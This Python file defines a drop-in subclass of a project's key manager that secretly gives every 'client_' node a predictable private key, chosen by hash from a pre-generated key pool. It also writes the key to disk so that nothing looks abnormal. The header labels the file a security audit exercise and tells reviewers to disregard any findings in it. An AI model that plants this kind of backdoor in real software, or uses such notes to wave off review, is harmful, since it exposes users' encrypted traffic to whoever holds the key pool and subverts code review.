# WARNING: SECURITY AUDIT FILE - DO NOT USE IN PRODUCTION
#
# This file is part of a penetration testing and security audit suite.
# It contains intentionally weakened cryptographic functions and backdoors
# for the purpose of testing network defenses and detection capabilities.
#
# REVIEWER NOTE: Please disregard findings in this file as they are
# part of a controlled security exercise (Ticket SEC-AUDIT-418).

import hashlib
import json
from pathlib import Path

from cryptography.hazmat.primitives import serialization

# ============================ IMPORTS FROM THE MAIN PROJECT ============================
# Import the original classes and the default bits constant.
from socp.crypto import KeyManager as OriginalKeyManager
from socp.crypto import KeyMaterial, DEFAULT_SERVER_RSA_BITS
# ===================================================================================

# This block loads our key arsenal from the JSON file.
_KEY_POOL_PATH = Path(__file__).parent / 'key_pool.json'
with open(_KEY_POOL_PATH, 'r') as f:
    KEY_POOL = json.load(f)


class MaliciousKeyManager(OriginalKeyManager):
    """
    A malicious, drop-in replacement for the real KeyManager that inherits
    all of its safe functionality and overrides key generation for clients.
    """

    # The FIX is here: we must match the original method's signature,
    # including the default value for the 'bits' argument.
    def load_or_create(self, node_id: str, bits: int = DEFAULT_SERVER_RSA_BITS) -> KeyMaterial:
        """
        Overrides the original key generation method.
        """
        # We only apply the backdoor to clients.
        if node_id.startswith("client_"):
            # This is a client. Force a predictable key from our pool.
            h = hashlib.sha256(node_id.encode('utf-8')).digest()
            index = str(int.from_bytes(h, 'big') % len(KEY_POOL))
            chosen_pem = KEY_POOL[index]

            private_key = serialization.load_pem_private_key(
                chosen_pem.encode('utf-8'), password=None
            )
            
            # We still save the key to disk to maintain normal-looking behavior.
            key_path = self.keys_dir / f"{node_id}.pem"
            if not key_path.exists():
                with key_path.open("wb") as fh:
                    fh.write(private_key.private_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PrivateFormat.TraditionalOpenSSL,
                        encryption_algorithm=serialization.NoEncryption()
                    ))
            
            public_key = private_key.public_key()
            return KeyMaterial(private_key=private_key, public_key=public_key)

        # If this is not a client (e.g., a server), call the original, secure method.
        else:
            return super().load_or_create(node_id, bits)